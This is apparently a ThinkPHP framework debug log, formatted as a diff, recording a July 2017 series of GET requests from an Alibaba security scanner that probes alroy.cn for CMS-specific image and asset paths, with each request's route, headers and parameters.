+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'theme',
+    1 => 'theme',
+    2 => 'default',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'bg_bnt_user_base_over.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:06+08:00 ] 60.205.45.195 140.205.201.41 GET /lib/images/vtip_arrow.gif
+[ log ] alroy.cn/lib/images/vtip_arrow.gif [运行时间：0.025388s][吞吐率：39.39req/s] [内存消耗：1,838.62kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'lib',
+    1 => 'images',
+    2 => 'vtip_arrow.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:07+08:00 ] 60.205.45.195 140.205.201.41 GET /dede/img/button_bg1.jpg
+[ log ] alroy.cn/dede/img/button_bg1.jpg [运行时间：0.028179s][吞吐率：35.49req/s] [内存消耗：1,838.52kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dede',
+    1 => 'img',
+    2 => 'button_bg1.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:07+08:00 ] 60.205.45.195 140.205.201.41 GET /plus/img/topsearch_submit.gif
+[ log ] alroy.cn/plus/img/topsearch_submit.gif [运行时间：0.026277s][吞吐率：38.06req/s] [内存消耗：1,838.61kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'plus',
+    1 => 'img',
+    2 => 'topsearch_submit.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:07+08:00 ] 60.205.45.195 140.205.201.41 GET /include/dialog/img/sp_bg.gif
+[ log ] alroy.cn/include/dialog/img/sp_bg.gif [运行时间：0.024864s][吞吐率：40.22req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'include',
+    1 => 'dialog',
+    2 => 'img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:07+08:00 ] 60.205.45.195 140.205.201.41 GET /images/topbanner_bg.png
+[ log ] alroy.cn/images/topbanner_bg.png [运行时间：0.027435s][吞吐率：36.45req/s] [内存消耗：1,838.58kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'topbanner_bg.png',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:08+08:00 ] 60.205.45.195 140.205.201.41 GET /system/images/lnk/system.gif
+[ log ] alroy.cn/system/images/lnk/system.gif [运行时间：0.025555s][吞吐率：39.13req/s] [内存消耗：1,838.65kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'system',
+    1 => 'images',
+    2 => 'lnk',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:08+08:00 ] 60.205.45.195 140.205.201.41 GET /images/confirm_close.gif
+[ log ] alroy.cn/images/confirm_close.gif [运行时间：0.027783s][吞吐率：35.99req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'confirm_close.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:08+08:00 ] 60.205.45.195 140.205.201.41 GET /user/images/must.gif
+[ log ] alroy.cn/user/images/must.gif [运行时间：0.025204s][吞吐率：39.68req/s] [内存消耗：1,838.47kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'images',
+    2 => 'must.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:09+08:00 ] 60.205.45.195 140.205.201.41 GET /template/images/li1.gif
+[ log ] alroy.cn/template/images/li1.gif [运行时间：0.026609s][吞吐率：37.58req/s] [内存消耗：1,838.72kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'template',
+    1 => 'images',
+    2 => 'li1.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:09+08:00 ] 60.205.45.195 140.205.201.41 GET /images/page_code.png
+[ log ] alroy.cn/images/page_code.png [运行时间：0.025563s][吞吐率：39.12req/s] [内存消耗：1,838.39kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'page_code.png',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:09+08:00 ] 60.205.45.195 140.205.201.41 GET /editors/index.html
+[ log ] alroy.cn/editors/index.html [运行时间：0.027424s][吞吐率：36.46req/s] [内存消耗：1,838.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'editors',
+    1 => 'index',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:10+08:00 ] 60.205.45.195 140.205.201.41 GET /images/samples/4_small.jpg
+[ log ] alroy.cn/images/samples/4_small.jpg [运行时间：0.026406s][吞吐率：37.87req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'samples',
+    2 => '4_small.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:10+08:00 ] 60.205.45.195 140.205.201.41 GET /includes/templates/classic/images/stars_5.gif
+[ log ] alroy.cn/includes/templates/classic/images/stars_5.gif [运行时间：0.025898s][吞吐率：38.61req/s] [内存消耗：1,839.21kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'includes',
+    1 => 'templates',
+    2 => 'classic',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'stars_5.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:10+08:00 ] 60.205.45.195 140.205.201.41 GET /includes/templates/template_default/images/always-free-shipping.gif
+[ log ] alroy.cn/includes/templates/template_default/images/always-free-shipping.gif [运行时间：0.025451s][吞吐率：39.29req/s] [内存消耗：1,839.42kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'includes',
+    1 => 'templates',
+    2 => 'template_default',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'always-free-shipping.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:11+08:00 ] 60.205.45.195 140.205.201.41 GET /includes/templates/template_default/buttons/english/button_tell_a_friend.gif
+[ log ] alroy.cn/includes/templates/template_default/buttons/english/button_tell_a_friend.gif [运行时间：0.025314s][吞吐率：39.50req/s] [内存消耗：1,839.34kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'includes',
+    1 => 'templates',
+    2 => 'template_default',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'buttons' => 'english',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:11+08:00 ] 60.205.45.195 140.205.201.41 GET /images/zttit02.png
+[ log ] alroy.cn/images/zttit02.png [运行时间：0.027634s][吞吐率：36.19req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'zttit02.png',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:11+08:00 ] 60.205.45.195 140.205.201.41 GET /Admin/Images/GoogleSiteMaplogo.gif
+[ log ] alroy.cn/Admin/Images/GoogleSiteMaplogo.gif [运行时间：0.026276s][吞吐率：38.06req/s] [内存消耗：1,839.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admin',
+    1 => 'Images',
+    2 => 'GoogleSiteMaplogo.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:12+08:00 ] 60.205.45.195 140.205.201.41 GET /template/user/images/manage_r2_c18.jpg
+[ log ] alroy.cn/template/user/images/manage_r2_c18.jpg [运行时间：0.025241s][吞吐率：39.62req/s] [内存消耗：1,838.44kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'template',
+    1 => 'user',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:12+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/admintitlebg.gif
+[ log ] alroy.cn/admin/images/admintitlebg.gif [运行时间：0.027774s][吞吐率：36.00req/s] [内存消耗：1,839.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'admintitlebg.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:12+08:00 ] 60.205.45.195 140.205.201.41 GET /images/gengtie.jpg
+[ log ] alroy.cn/images/gengtie.jpg [运行时间：0.027636s][吞吐率：36.18req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'gengtie.jpg',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:13+08:00 ] 60.205.45.195 140.205.201.41 GET /core/themes/stable/images/core/menu-collapsed-rtl.png
+[ log ] alroy.cn/core/themes/stable/images/core/menu-collapsed-rtl.png [运行时间：0.025205s][吞吐率：39.67req/s] [内存消耗：1,839.18kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'core',
+    1 => 'themes',
+    2 => 'stable',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'core',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:13+08:00 ] 60.205.45.195 140.205.201.41 GET /misc/menu-expanded.png
+[ log ] alroy.cn/misc/menu-expanded.png [运行时间：0.024732s][吞吐率：40.43req/s] [内存消耗：1,838.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'misc',
+    1 => 'menu-expanded.png',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:13+08:00 ] 60.205.45.195 140.205.201.41 GET /Admin/Images/icon_lpdhjl.png
+[ log ] alroy.cn/Admin/Images/icon_lpdhjl.png [运行时间：0.029883s][吞吐率：33.46req/s] [内存消耗：1,839.77kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admin',
+    1 => 'Images',
+    2 => 'icon_lpdhjl.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:14+08:00 ] 60.205.45.195 140.205.201.41 GET /store/Images/hdfk.gif
+[ log ] alroy.cn/store/Images/hdfk.gif [运行时间：0.028280s][吞吐率：35.36req/s] [内存消耗：1,838.44kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'store',
+    1 => 'Images',
+    2 => 'hdfk.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:14+08:00 ] 60.205.45.195 140.205.201.41 GET /skins/doccms_model_1/images/bg_contact_a.png
+[ log ] alroy.cn/skins/doccms_model_1/images/bg_contact_a.png [运行时间：0.028018s][吞吐率：35.69req/s] [内存消耗：1,838.70kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'skins',
+    1 => 'doccms_model_1',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:14+08:00 ] 60.205.45.195 140.205.201.41 GET /admini/images/s_managehtml/icon_refresh.png
+[ log ] alroy.cn/admini/images/s_managehtml/icon_refresh.png [运行时间：0.026921s][吞吐率：37.15req/s] [内存消耗：1,838.62kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admini',
+    1 => 'images',
+    2 => 's_managehtml',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:14+08:00 ] 60.205.45.195 140.205.201.41 GET /Admin/Images/Icon-Nav-Close-over.gif
+[ log ] alroy.cn/Admin/Images/Icon-Nav-Close-over.gif [运行时间：0.028430s][吞吐率：35.17req/s] [内存消耗：1,839.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admin',
+    1 => 'Images',
+    2 => 'Icon-Nav-Close-over.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:15+08:00 ] 60.205.45.195 140.205.201.41 GET /images/menu_righttop.gif
+[ log ] alroy.cn/images/menu_righttop.gif [运行时间：0.024954s][吞吐率：40.07req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'menu_righttop.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:15+08:00 ] 60.205.45.195 140.205.201.41 GET /app/resource/images/coupon-hd-bg.png
